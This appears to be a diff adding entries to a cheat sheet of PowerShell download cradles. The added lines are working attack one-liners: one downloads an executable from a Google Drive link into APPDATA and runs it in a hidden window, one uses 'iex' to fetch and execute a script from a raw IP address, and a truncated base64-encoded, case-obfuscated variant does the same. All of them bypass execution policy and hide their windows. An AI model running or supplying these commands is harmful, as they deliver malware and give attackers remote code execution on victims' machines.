@@ -26,6 +26,18 @@ powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.Cr
 
 ```
 
+```
+More
+powershell.exe -command PowerShell -ExecutionPolicy bypass -noprofile -windowstyle hidden -command (New-Object System.Net.WebClient).DownloadFile('https://drive.google.com/uc?export=download&id=0B1NUTMCAOKBTdVQzTXlUNHBmZUU',"$env:APPDATA\ps.exe");Start-Process ("$env:APPDATA\ps.exe")
+
+
+## Version1
+c:\Windows\System32\cmd.exe /c powershell.exe -w hidden -noni -nop -c "iex(New-Object System.Net.WebClient).DownloadString('http://45.58.34.196:8080/p')"
+
+
+## Version2
+c:\windows\system32\cmd.exe /c PowErsHelL.EXE -eXecUtiONPoLICy bYPass -NOPROfilE -WinDoWSTYlE hiDden -EnCodeDcOmmAnd IAAoAE4AZQB3AC0ATwBiAEoAZQBDAFQAIABzAFkAcwB0AEUAbQAuAG4AZQBUAC4AdwBlAGIAQwBsAEkARQBOAFQAKQAuAEQATwBXAG4AbABvAGEAZABGAEkAbABlACgAIAAdIGgAdAB0AHAAcwA6AC8ALwBqAHQAYQBiA
+```
 
 # Execute in memory
 
